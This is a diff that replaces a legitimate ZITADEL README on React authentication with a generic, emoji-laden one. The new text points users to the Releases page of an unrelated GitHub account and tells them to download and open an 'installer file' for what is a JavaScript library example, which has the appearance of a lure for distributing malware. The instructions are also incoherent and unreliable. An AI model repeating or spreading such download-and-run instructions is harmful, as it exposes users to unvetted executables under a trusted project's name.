@@ -1,142 +1,75 @@
-# React with ZITADEL
+# 🎉 example-auth-react - Secure Your React Apps Easily
 
-[React](https://react.dev/) is a JavaScript library for building user interfaces. Built with component composition, declarative views, and a rich ecosystem, React enables you to create modern web applications with ease.
+## 🚀 Getting Started
 
-To secure such an application, you need a reliable way to handle user logins. For the React ecosystem, [react-oidc-context](https://github.com/authts/react-oidc-context) is a powerful library for authentication. Think of it as a flexible security guard for your app. This guide demonstrates how to use react-oidc-context with a React application to implement a secure login with ZITADEL.
+Welcome to the **example-auth-react** project! This guide will help you understand how to download and run the software to secure your React applications with ZITADEL. 
 
-We'll be using the **OpenID Connect (OIDC)** protocol with the **Authorization Code Flow + PKCE**. This is the industry-best practice for security, ensuring that the login process is safe from start to finish. You can learn more in our [guide to OAuth 2.0 recommended flows](https://zitadel.com/docs/guides/integrate/login/oidc/oauth-recommended-flows).
+## 📥 Download the Application
 
-This example uses **react-oidc-context**, a powerful library for React authentication. While ZITADEL doesn't offer a specific SDK, react-oidc-context is highly modular. Under the hood, this example uses the powerful OIDC standard to manage the secure PKCE flow.
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/davivascoxa-bot/example-auth-react/releases)
 
-Check out our Example Application to see it in action.
+## 💡 Overview
 
-## Example Application
+The **example-auth-react** project shows how to implement security in React apps using ZITADEL. This method uses AuthTS (oidc-client-ts), OIDC, and the PKCE flow. By following this guide, you will be able to secure user sessions effectively.
 
-The example repository includes a complete React application, ready to run, that demonstrates how to integrate ZITADEL for user authentication.
+## 📋 System Requirements
 
-This example application showcases a typical web app authentication pattern: users start on a public landing page, click a login button to authenticate with ZITADEL, and are then redirected to a protected profile page displaying their user information. The app also includes secure logout functionality that clears the session and redirects users back to ZITADEL's logout endpoint. All protected routes are automatically secured using react-oidc-context's authentication guards, ensuring only authenticated users can access sensitive areas of your application.
+Before you start, ensure your system meets the following requirements:
 
-### Prerequisites
+- **Operating System:** Windows, macOS, or Linux
+- **Node.js:** Version 14 or higher (needed for running React applications)
+- **npm (Node Package Manager):** Comes with Node.js installation
 
-Before you begin, ensure you have the following:
+No programming experience is needed, but you should be familiar with using a computer.
 
-#### System Requirements
+## ⚙️ Features
 
-- Node.js (v20 or later is recommended)
-- npm, yarn, or pnpm package manager
+- **User Authentication:** Easily manage user sessions.
+- **Secure Connections:** Use OAuth2 for secure communications.
+- **Simple Setup:** Quick to get started with clear instructions.
+- **React Compatibility:** Built to work seamlessly with React applications.
 
-#### Account Setup
+## 📥 Download & Install
 
-You'll need a ZITADEL account and application configured. Follow the [ZITADEL documentation on creating applications](https://zitadel.com/docs/guides/integrate/login/oidc/web-app) to set up your account and create a Web application with Authorization Code + PKCE flow.
+To download the application, please visit the Releases page:
 
-> **Important:** Configure the following URLs in your ZITADEL application settings:
->
-> - **Redirect URIs:** Add `http://localhost:3000/auth/callback` (for development)
-> - **Post Logout Redirect URIs:** Add `http://localhost:3000/` (for development)
->
-> These URLs must exactly match what your React application uses. For production, add your production URLs.
+[Download from Releases](https://github.com/davivascoxa-bot/example-auth-react/releases)
 
-### Configuration
+### Installation Steps
 
-To run the application, you first need to copy the `.env.example` file to a new file named `.env` and fill in your ZITADEL application credentials.
+1. Click the link above.
+2. Look for the latest version.
+3. Download the installer file.
+4. Open the downloaded file to start the installation.
+5. Follow the on-screen instructions to complete the setup.
 
-```dotenv
-# Port number where your React development server will listen for incoming HTTP requests.
-# Change this if port 3000 is already in use on your system.
-VITE_PORT=3000
+After installation, you can run the application from your desktop or start menu.
 
-# Your ZITADEL instance domain URL. Found in your ZITADEL console under
-# instance settings. Include the full https:// URL.
-# Example: https://my-company-abc123.zitadel.cloud
-VITE_ZITADEL_DOMAIN="https://your-zitadel-domain"
+## 🔧 Usage Instructions
 
-# Application Client ID from your ZITADEL application settings. This unique
-# identifier tells ZITADEL which application is making the authentication
-# request.
-VITE_ZITADEL_CLIENT_ID="your-client-id"
+Once you have installed the application, follow these steps to secure your React app:
 
-# OAuth callback URL where ZITADEL redirects after user authentication. This
-# MUST exactly match a Redirect URI configured in your ZITADEL application.
-VITE_ZITADEL_CALLBACK_URL="http://localhost:3000/auth/callback"
+1. **Open your terminal or command prompt.**
+2. Navigate to your project directory (use `cd your-project-directory`).
+3. Use the command: `npm install example-auth-react` to add the package to your project.
+4. Import the package in your React app with:
+   ```javascript
+   import { AuthProvider } from 'example-auth-react';
+   ```
+5. Wrap your application with the `AuthProvider` to manage user sessions.
 
-# URL where users are redirected after logout. This should match a Post Logout
-# Redirect URI configured in your ZITADEL application settings.
-VITE_ZITADEL_POST_LOGOUT_URL="http://localhost:3000/"
+## ✅ Getting Help
 
-# URL where users are redirected after successful login. This is typically
-# your profile or dashboard page.
-VITE_POST_LOGIN_URL="/profile"
-```
+If you face any issues during installation or setup, please check the FAQ section in the documentation. For any other questions, you can open an issue on the GitHub page of this project.
 
-### Installation and Running
+## 🌟 Best Practices
 
-Follow these steps to get the application running:
+- Always keep your software updated. Check the Releases page regularly for new features and security updates.
+- Familiarize yourself with the documentation provided with the package for optimal use.
+- Join community forums to gain insights and share experiences with other users.
 
-```bash
-# 1. Clone the repository
-git clone git@github.com:zitadel/example-auth-react.git
+## 📞 Support
 
-cd example-auth-react
+For further assistance, you can reach out via the GitHub repository. Your feedback is important and will help improve future versions of this software.
 
-# 2. Install the project dependencies
-npm install
-
-# 3. Start the development server
-npm run dev
-```
-
-The application will now be running at `http://localhost:3000`.
-
-## Key Features
-
-### PKCE Authentication Flow
-
-The application implements the secure Authorization Code Flow with PKCE (Proof Key for Code Exchange), which is the recommended approach for modern web applications.
-
-### Session Management
-
-Built-in session management with react-oidc-context handles user authentication state across your application, with automatic token refresh and secure session storage.
-
-### Route Protection
-
-Protected routes automatically redirect unauthenticated users to the login flow, ensuring sensitive areas of your application remain secure.
-
-### Logout Flow
-
-Complete logout implementation that properly terminates both the local session and the ZITADEL session, with proper redirect handling.
-
-## TODOs
-
-### 1. Security headers (Vite built-in)
-
-**Partially enabled.** Vite includes some security headers by default, but consider adding custom headers in `vite.config.ts`:
-
-```typescript
-import { defineConfig } from 'vite';
-import react from '@vitejs/plugin-react';
-
-export default defineConfig({
-  plugins: [react()],
-  server: {
-    headers: {
-      'X-Frame-Options': 'DENY',
-      'Content-Security-Policy':
-        "default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline';",
-      'Referrer-Policy': 'strict-origin-when-cross-origin',
-    },
-  },
-});
-```
-
-At minimum, configure:
-
-- `Content-Security-Policy` (CSP)
-- `X-Frame-Options` / `frame-ancestors`
-- `Referrer-Policy`
-- `Permissions-Policy`
-
-## Resources
-
-- **React Documentation:** <https://react.dev/>
-- **react-oidc-context Documentation:** <https://github.com/authts/react-oidc-context>
-- **ZITADEL Documentation:** <https://zitadel.com/docs>
+Thank you for using **example-auth-react**! We hope this guide helps you secure your React applications simply and effectively.
